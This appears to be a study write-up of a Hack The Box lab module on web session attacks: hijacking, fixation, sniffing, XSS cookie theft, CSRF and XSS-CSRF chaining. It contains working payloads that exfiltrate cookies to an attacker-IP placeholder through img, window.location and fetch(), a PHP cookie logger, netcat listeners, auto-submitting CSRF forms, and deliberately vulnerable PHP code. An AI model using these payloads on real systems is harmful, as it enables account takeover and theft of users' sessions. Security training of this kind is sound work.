- [Session Security](#session-security)
  - [Intro](#intro)
    - [Session Identifier Security](#session-identifier-security)
    - [Session Attacks](#session-attacks)
  - [Session Attacks](#session-attacks-1)
    - [Session Hijacking](#session-hijacking)
      - [Example](#example)
        - [Part 1: Identify the session identifier](#part-1-identify-the-session-identifier)
        - [Part 2: Simulate an attacker](#part-2-simulate-an-attacker)
    - [Session Fixation](#session-fixation)
      - [Example](#example-1)
      - [Example of vulnerable code](#example-of-vulnerable-code)
    - [Obtaining Session Identifiers without User Interaction](#obtaining-session-identifiers-without-user-interaction)
      - [Obtaining Session Identifiers via Traffic Sniffing](#obtaining-session-identifiers-via-traffic-sniffing)
      - [Obtaining Session Identifiers Post-Exploitation](#obtaining-session-identifiers-post-exploitation)
        - [PHP](#php)
        - [Java](#java)
        - [.NET](#net)
      - [Obtaining Session Identifiers Post-Exploitation - Database Access](#obtaining-session-identifiers-post-exploitation---database-access)
    - [XSS](#xss)
      - [Example](#example-2)
        - [Obtaining session cookie through XSS](#obtaining-session-cookie-through-xss)
        - [Obtaining session cookies through XSS (Netcat edition)](#obtaining-session-cookies-through-xss-netcat-edition)
    - [CSRF](#csrf)
      - [Example](#example-3)
    - [CSRF - GET-based](#csrf---get-based)
      - [Example](#example-4)
    - [CSRF - POST-based](#csrf---post-based)
      - [Example](#example-5)
    - [XSS \& CSRF Chaining](#xss--csrf-chaining)
      - [Example](#example-6)

---

# Session Security

## Intro

A user session can defined as a sequence of requests originating from the same client and the associated responses during a specific time period. Modern web apps need to maintain user sessions to keep track of information and status about each user. User sessions faciliate the assignment of access or authorization rights, localization settings, etc., while users interact with an app, pre, and post-authentication.

Each HTTP request should carry all needed information for the server to act upon it appropriately, and the session state resides on the client's side only.

### Session Identifier Security

A unique session identifier (_Session ID_) or token is the basis upon which user sessions are generated and distinguished.

If an attacker obtains a session identifier, this can result in session hijacking, where the attacker can essentially impersonate the victim in the web app. A session identifier can be:

- captured through passive traffic/packet sniffing
- identified in logs
- predicted
- brute forced

A session identifier's security level depends on its:

- Validity Scope (_a secure session identifier should be valid for one session only_)
- Randomnsess (_a secure session identifier should be generated through a robust number/string generation algorithm so that it cannot be predicted_)
- Validity Time (_a secure session identifier should expire after a certain amount of time_)

A session identifier's security level also depends on the location where it is stored:

| Location | Description |
| -------- | ----------- |
| URL | if this is the case, the HTTP _Referer_ header can leak a session identifier to other websites; in addition, browser history will also contain any session identifier stored in the URL |
| HTML | if this is the case, the session identifier can be identified in both the browser's cache memory and any intermediate proxies |
| sessionStorage | ... is a browser storage feature introduced in HTML5; session identifiers stored in sessionStorage can be retrieved as long as the tab or the browser is open; in other words, sessionStorage data gets cleared when the _page session_ ends; note that a page session survives over page reloads and restores |
| localStorage | ... is a browser storage feature introduced in HTML5; session identifiers stored in localStorage can be retrieved as long as localStorage does not get deleted by the user; this is because data stored within localStorage will not be deleted when the browser process is terminated, with the exception of "private browsing" or "incognito" sessions where data stored within localStorage are deleted by the time the last tab is closed |

### Session Attacks

Can be:

- Session Hijacking
- Session Fixation
- XSS
- CSRF
- Open Redirects

## Session Attacks

### Session Hijacking

In session hijacking attacks, the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim.

An attacker can obtain a victim's session identifier using several methods, with the most common being:

- passive traffic sniffing
- XSS
- browser history or log-diving
- read access to a database containing session information

#### Example

##### Part 1: Identify the session identifier

- log into app, using given creds
- use Web Dev Tools
- look for cookie that can be session identifier

![session security 1](../../../images/session_security1.png)

##### Part 2: Simulate an attacker

- copy cookie
- open new private window
- insert copied cookie
- notice, you can log in without giving creds

![session security 2](../../../images/session_security2.png)

### Session Fixation

... occurs when an attacker can fixate a (_valid_) session identifier. The Attacker will then have to trick the victim into logging into the application using the aforementioned session identifier. If the victim does so, the attacker can proceed to a Session Hijacking attack.

Such bugs usually occur when session identifiers are being accepted from URL Query Strings or Post Data.

Such attacks are usually mounted in three stages:

1. Attacker manages to obtain a valid session identifier
2. Attacker manages to fixate a valid session identifier
3. Attacke tricks the victim into establishing a session using the abovementioned session identifier

#### Example

1. Session fixation identification

![session fixation 1](../../../images/session_fixation1.png)

If any value or a valid session identifier specified in the ```token``` parameter on the URL is propagated to the ```PHPSESSID``` cookie's value, you are probably dealing with a session fixation vuln.

2. Session fixation exploitation attempt

![session fixation 2](../../../images/session_fixation2.png)

Notice that the ```PHPSESSID``` cookie's value is ```IControlThisCookie```. You are dealing with a Session Fixation vuln. An attacker could send a URL similar to the above to a victim. If the victim logs into the application, the attacker could easily hijack their session since the session identifier is already known.

#### Example of vulnerable code

```php
<?php
    if (!isset($_GET["token"])) {
        session_start();
        header("Location: /?redirect_uri=/complete.html&token=" . session_id());
    } else {
        setcookie("PHPSESSID", $_GET["token"]);
    }
?>
```

### Obtaining Session Identifiers without User Interaction

#### Obtaining Session Identifiers via Traffic Sniffing

Traffic Sniffing is something that most penetration testers do when asessing a network's security from the inside. It requires the attacker and the victim to be on the same local network. Then and only then can HTTP traffic be inspected by the attacker. It is impossible to perform traffic sniffing remotely.

1. Obtain the victim's cookie through packet analysis
   1. inside Wireshark, first, apply to see only HTTP traffic
   2. now search within the Packet bytes for any ```auth-session``` cookies
   3. navigate to ```Edit```, then to ```Find Packet```
   4. left click on ```Packet List```, then on ```Packet bytes```
   5. select string and specify ```auth-session```
   6. click ```find```
   7. copy the cookie by right-clicking on a row that contains it
   8. click ```copy```, then ```Value```


2. Hijack the victim's session
   1. back on the browser and change the current cookie's value into the obtained value
   2. refresh page

#### Obtaining Session Identifiers Post-Exploitation

During the post-exploitation phase, session identifiers and session data can be retrieved from either a web server's disk or memory.

##### PHP

The entry ```session.save_path``` in ```PHP.ini``` specifies where session data will be stored.

```bash
d41y@htb[/htb]$ locate php.ini
d41y@htb[/htb]$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'
d41y@htb[/htb]$ cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
```

A default config could store session data in ```/var/lib/php/sessions``` and could look like this:

![session no interaction 1](../../../images/session_no_interaction_1.png)

The same PHP session identifier could look like this on a local setup:

```bash
d41y@htb[/htb]$ ls /var/lib/php/sessions
d41y@htb[/htb]$ cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
```

![session no interaction 2](../../../images/session_no_interaction_2.png)

For a hacker to hijack the user session related to the session identifier above, a new cookie must be created in the web browser with the following values:

- cookie name: PHPSESSID
- cookie value: s6kitq8d3071rmlvbfitpim9mm

##### Java

"The Manager element represents the session manager that is used to create and maintain HTTP sessions of a web application.

Tomcat provides two standard implementations of Manager. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out in a storage location that is selected via the use of an appropriate ```Store``` nested element. The filename of the default session data file is ```SESSIONS.ser```."

[More info here!](https://tomcat.apache.org/tomcat-6.0-doc/config/manager.html)

##### .NET

Session data can be found in:

- the application worker process (_```aspnet_wp.exe```_)
- StateServer
- SQL Server

[More info here!](https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/)

#### Obtaining Session Identifiers Post-Exploitation - Database Access

In cases where you have direct access to a database, you should always check for any stored user sessions.

```sql
show databases;
use project;
show tables;
select * from users;
```

![session no interaction 3](../../../images/session_no_interaction_3.png)

Here you can see the user's passwords are hashed. You could spend time trying to crack these; however, there is also a "all_sessions" table.

```sql
select * from all_sessions;
select * from all_sessions where id=3;
```

![session no interaction 4](../../../images/session_no_interaction_4.png)

Here you have successfully extracted the sessions!

### XSS

For an XSS attack to result in session cookie leakge, the following requirements must be fulfilled:

- Session cookies should be carried in all HTTP requests
- Session cookies should be accessible by JS code

#### Example

![xss 1](../../../images/session_security_xss1.png)

In one field, you can specify the following payload:

```javascript
"><img src=x onerror=prompt(document.domain)>
```

You are using ```document.domain``` to ensure that JS is being executed on the actual domain and not in a sandboxed environment. JS being executed in a sandboxed environment prevents client-side attacks.

In the remaining two fields, you specify the following two payloads.

```javascript
"><img src=x onerror=confirm(1)>
```

... and:

```javascript
"><img src=x onerror=alert(1)>
```

You will need to update the profile by pressing "Save" to submit the payloads.

![xss 2](../../../images/session_security_xss2.png)


When successful, you notice no payload being triggered. Often the payload code is not going to be called/executed until another application functionality triggers it. Go to "Share", as it is the only other functionality you have, to see if any of the submitted payloads are retrieved in there. This functionality returns a publicly accessible profile. Identifying a stored XSS vuln in such a functionality would be ideal from an attacker's perspective.

![xss 3](../../../images/session_security_xss3.png)

Checking if HTTPOnly flag is set:

![xss 4](../../../images/session_security_xss4.png)

... and it's turned off.

##### Obtaining session cookie through XSS

You identified that you could create and share publicly accessible profiles that contain your specified XSS payloads.

The below PHP script can be hosted on a VPS to log cookies:

```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

It can be run like this:

```bash
d41y@htb[/htb]$ php -S <VPN/TUN Adapter IP>:8000
[Mon Mar  7 10:54:04 2022] PHP 7.4.21 Development Server (http://<VPN/TUN Adapter IP>:8000) started
```

And the JS payload can be:

```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

_A sample HTTPS>HTTPS payload can be_:

```javascript
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

To test it, you now need to simulate a victim that logs into his or her account and navigates to ```http://xss.htb.net/profile?email=ela.stienen@example.com```.

Brings you the cookie:

```bash
┌──(d41y㉿user)-[~/ctf/htb/vpns]
└─$ php -S 10.10.15.211:8000
[Thu Jun  5 16:54:16 2025] PHP 8.3.6 Development Server (http://10.10.15.211:8000) started
[Thu Jun  5 16:54:23 2025] 10.10.15.211:43762 Accepted
[Thu Jun  5 16:54:23 2025] 10.10.15.211:43762 [404]: GET /log.php?c=auth-session=s%3AxPy0i5ab8K2Kqxr7XX83jApGWqisXRzW.Lg3WQ4lXpdexxCKvvaTOFqqNu51TUJ%2F%2Bavh0PcCEmQI - No such file or directory
[Thu Jun  5 16:54:23 2025] 10.10.15.211:43762 Closing
[Thu Jun  5 16:54:23 2025] 10.10.15.211:43776 Accepted
[Thu Jun  5 16:54:23 2025] 10.10.15.211:43776 [404]: GET /favicon.ico - No such file or directory
[Thu Jun  5 16:54:23 2025] 10.10.15.211:43776 Closing
```

##### Obtaining session cookies through XSS (Netcat edition)

First, you need to place the payload into the vulnerable field and click "Save".

Payload:

```javascript
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
```

Also, instruct Netcat to listen on port 8000:

```bash
d41y@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

Simulating the victim and navigating to the shared profile of Ela, brings you the cookie when the victim hovers over "test":

```bash
┌──(d41y㉿user)-[~/ctf/htb/vpns]
└─$ nc -lnvp 8000        
Listening on 0.0.0.0 8000
Connection received on 10.10.15.211 56118
GET /?cookie=YXV0aC1zZXNzaW9uPXMlM0F4UHkwaTVhYjhLMktxeHI3WFg4M2pBcEdXcWlzWFJ6Vy5MZzNXUTRsWHBkZXh4Q0t2dmFUT0ZxcU51NTFUVUolMkYlMkJhdmgwUGNDRW1RSQ== HTTP/1.1
Host: 10.10.15.211:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://xss.htb.net/
Priority: u=4, i
```

You can no hijack the victim's session.

>[!TIP]
> You don't necessarily have to use the ```window.location()``` object that causes the victim to get redirected. You can use ```fetch()```, which can fetch data and send it to your server without any redirects. This is a stealthier way.<br>
> Example:<br>
> ```<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>```

### CSRF

... is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf.

A web app is vulnerable to CSRF when:

- all the parameters required for the targeted request can be determined or guessed by the attacker
- the application's session management is solely based on HTTP cookies, which are automatically included in browser request

To successfully exploit CSRF, you need:

- to craft a malicious web page that will issue a valid (_cross-site_) request impersonating the victim
- the victim to be logged into the application at the time when the malicious cross-site request is issued

#### Example

Log in with given credentials, activate Burpsuite and change the contact info.

Interception with Burp:

![csrf 1](../../../images/session_security_csrf1.png)

You notice no anti-CSRF token in the update-profile request. Now try executing a CSRF attack that will change her profile details by simply visiting another website.

Create and serve the below HTML:

```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

... and:

```bash
d41y@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

Open a new tab and visit the page you are serving from your attacking machine:

![csrf 2](../../../images/session_security_csrf2.png)

### CSRF - GET-based

Similar to how you can extract session cookies from applications that do not utilize SSL encryption, you can do the same regarding CSRF tokens included in unencrypted requests.

#### Example

Log on with given credentials. Browse to the profile and click "Save".

![csrf 3](../../../images/session_security_csrf3.png)

Activate Burp and click "Save" again.

![csrf 4](../../../images/session_security_csrf4.png)

The CSRF token is included in the GET request.

Now simulate an attacker on the local network that sniffed the abovementioned request and wants to deface Julie Rogers' profile through a CSRF attack.

First, create and serve the below HTML:

```html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

... and:

```bash
d41y@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

Open a new tab and visit the page you are serving from your attacking machine.

![csrf 5](../../../images/session_security_csrf5.png)

### CSRF - POST-based

#### Example

Log in with the given credentials and click on "Delete". You will get redirected to ```/app/delete/<your-email>```.

![csrf 6](../../../images/session_security_csrf6.png)


Notice that the email is reflected on the page. Try inputting some HTML into the email value, such as:

```html
<h1>h1<u>underline<%2fu><%2fh1>
```

![csrf 7](../../../images/session_security_csrf7.png)

If you inspect the source, you will notice that your injection happens before a ```'```. You can abuse this to leak the CSRF token.

![csrf 8](../../../images/session_security_csrf8.png)

First, instruct Netcat to listen on port 8000:

```bash
d41y@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

Now you can get the CSRF token via sending the below payload:

```html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

While still loggen in as Julie Rogers, open a new tab and visit the ```http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f```. You will notice a connection being made that leaks the CSRF token.

![csrf 9](../../../images/session_security_csrf9.png)

### XSS & CSRF Chaining

#### Example

Log in with the given credentials, activate Burp and click "Make Public!".

![csrf 10](../../../images/session_security_csrf10.png)

... leads to:

![csrf 11](../../../images/session_security_csrf11.png)

Forward all requests so that Ela Stienen's profile becomes public.

The payload you need to specify in the _Country Field_ of Ela Stienen's profile to successfully execute CSRF:

```javascript
<script>
// part1: creates an ObjectVariable called req, which you will be using to generate a request
var req = new XMLHttpRequest();
// is allowing you to get ready to send HTTP requests
req.onload = handleResponse;
// the 'onload' event handler performs an action once the page has been loaded
req.open('get','/app/change-visibility',true);
// request method, targeted path, continuation of execution
req.send();
// will send everything you constructed in the HTTP request
// part1
// part2: defines a function called 'handleResponse'
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    // defines a variable called 'token', which gets the value of 'responseText'
    // '/name="csrf" type="hidden" value="(\w+)"/)[1];' looks for a hidden input field called 'csrf' and \w+ matches one or more alphanumeric chars
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    // changes the method from GET to POST
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    // sets 'Content-Type' to 'application/x-www-form-urlencoded'
    changeReq.send('csrf='+token+'&action=change');
    // sends the request with one param called 'csrf' having the value of the 'token' variable, and another called 'action' with the value 'change'
};
// part2
</script>
```

Now, try to make the victim's profile public.

First, submit the full payload to the _Country Field_ of Ela Stienen's profile and click "Save".

![csrf 12](../../../images/session_security_csrf12.png)

Open a new private window, navigate to the website again, and log in using different credentials.

This user has its profile "private". No "Share" functionality exists.

![csrf 13](../../../images/session_security_csrf13.png)

Open a new tab and browse Ela Stienen's public profile by navigating to ```http://minilab.htb.net/profile?email=ela.stienen@example.com```.

Now, if you go back to the victim's usual profile page and refresh/reload the page, you should see that his profile became "public".

![csrf 14](../../../images/session_security_csrf14.png)

You just executed a CSRF-attack through XSS, bypassing the _same origin/same site_ protections in place.
